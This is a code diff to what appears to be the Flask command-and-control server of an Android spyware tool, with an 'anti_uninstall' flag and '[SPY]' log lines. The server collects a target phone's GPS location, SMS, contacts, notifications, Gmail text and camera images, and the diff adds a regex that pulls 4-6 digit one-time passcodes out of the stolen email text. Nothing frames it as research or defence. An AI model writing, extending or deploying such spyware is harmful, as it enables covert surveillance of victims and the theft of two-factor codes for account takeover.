@@ -1,4 +1,5 @@
 import os
+import re
 from flask import Flask, render_template, request, jsonify, session, redirect, url_for
 
 app = Flask(__name__)
@@ -9,17 +10,7 @@ PASSWORD = "jaxrat123"
 
 devices = {"hp_target_1": {"name": "HP Target", "status": "online", "last_seen": "-", "anti_uninstall": True}}
 latest_commands = {"hp_target_1": "none"}
-
-# Menampung semua tipe data spy
-latest_results = {
-    "hp_target_1": {
-        "gps": "Belum ada data", 
-        "sms": [], 
-        "contacts": [], 
-        "notifs": [], 
-        "gmail": ""
-    }
-}
+latest_results = {"hp_target_1": {"gps": "Belum ada data", "sms": [], "contacts": [], "notifs": [], "gmail": "", "otp": ""}}
 
 UPLOAD_FOLDER = os.path.join(app.root_path, 'static', 'uploads')
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
@@ -69,28 +60,28 @@ def upload_result(device_id):
     data = request.json
     if device_id in latest_results:
         tipe = data.get("type")
-        if tipe == "gps":
-            latest_results[device_id]["gps"] = data.get("data")
-        elif tipe == "sms":
-            latest_results[device_id]["sms"] = data.get("data")
-        elif tipe == "contacts":
-            latest_results[device_id]["contacts"] = data.get("data")
+        if tipe == "gps": latest_results[device_id]["gps"] = data.get("data")
+        elif tipe == "sms": latest_results[device_id]["sms"] = data.get("data")
+        elif tipe == "contacts": latest_results[device_id]["contacts"] = data.get("data")
         elif tipe == "gmail":
-            latest_results[device_id]["gmail"] = data.get("data")
-            print(f"[SPY] Teks Gmail masuk!")
-        print(f"[SPY] Data {tipe} masuk dari {device_id}")
+            text = data.get("data", "")
+            latest_results[device_id]["gmail"] = text
+            # LOGIKA FILTER OTP (Cari angka 4-6 digit)
+            otp_match = re.findall(r'\b\d{4,6}\b', text)
+            if otp_match:
+                latest_results[device_id]["otp"] = otp_match[0] # Ambil yang pertama ketemu
+                print(f"[SPY] OTP Gmail ditemukan: {otp_match[0]}")
+            print(f"[SPY] Teks Email masuk!")
     return jsonify({"status": "success"})
 
-# Endpoint notifikasi (dipanggil terus-terusan, jadi dibuat terpisah biar rapi)
 @app.route('/api/upload_notification/<device_id>', methods=['POST'])
 def upload_notification(device_id):
     data = request.json
     if device_id in latest_results:
         notif_list = latest_results[device_id]["notifs"]
         notif_list.insert(0, data)
-        if len(notif_list) > 30:
-            notif_list.pop()
-        print(f"[SPY] Notif masuk dari {data.get('app')}")
+        if len(notif_list) > 30: notif_list.pop()
+        print(f"[SPY] Notif masuk: {data.get('app')}")
     return jsonify({"status": "success"})
 
 @app.route('/api/get_results/<device_id>', methods=['GET'])
@@ -106,7 +97,7 @@ def clear_result(device_id, result_type):
         elif result_type == "sms": latest_results[device_id]["sms"] = []
         elif result_type == "contacts": latest_results[device_id]["contacts"] = []
         elif result_type == "notifs": latest_results[device_id]["notifs"] = []
-        elif result_type == "gmail": latest_results[device_id]["gmail"] = ""
+        elif result_type == "gmail": latest_results[device_id]["gmail"] = ""; latest_results[device_id]["otp"] = ""
     return jsonify({"status": "success"})
 
 @app.route('/api/set_blocked_apps/<device_id>', methods=['POST'])
@@ -125,7 +116,6 @@ def upload_image(device_id):
     if file.filename == '': return jsonify({"status": "error"}), 400
     filepath = os.path.join(UPLOAD_FOLDER, 'latest.jpg')
     file.save(filepath)
-    print(f"[SPY] Gambar kamera diterima!")
     return jsonify({"status": "success"})
 
 if __name__ == '__main__':
